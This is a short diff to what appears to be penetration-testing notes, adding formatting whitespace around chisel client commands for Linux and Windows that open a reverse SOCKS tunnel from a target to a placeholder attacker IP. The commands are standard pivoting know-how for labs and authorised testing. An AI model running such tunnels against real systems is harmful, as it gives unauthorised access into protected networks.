@@ -7,11 +7,13 @@ On the attacking machine run:
 On target run:
 
 Linux:
+
 ```bash
 ./chisel client <attacker_IP>:8002 R:1080:socks
 ```
 
 Windows:
+
 ```bash
 chisel.exe client <attacker_IP>:8002 R:1080:socks
 ```
